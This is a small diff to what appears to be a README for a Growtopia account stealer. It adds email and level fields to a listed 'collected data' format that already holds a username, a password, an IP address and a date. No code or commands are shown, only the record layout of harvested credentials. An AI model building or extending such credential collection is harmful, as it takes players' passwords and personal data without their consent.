@@ -11,6 +11,8 @@ Collected data is saved in this format: <br>
 ```
 GrowID=Username
 Password=Password
+Email=email@example.com
+Level=20
 IP=127.0.0.1
 Date=2020-01-01 12:00:00
 ```
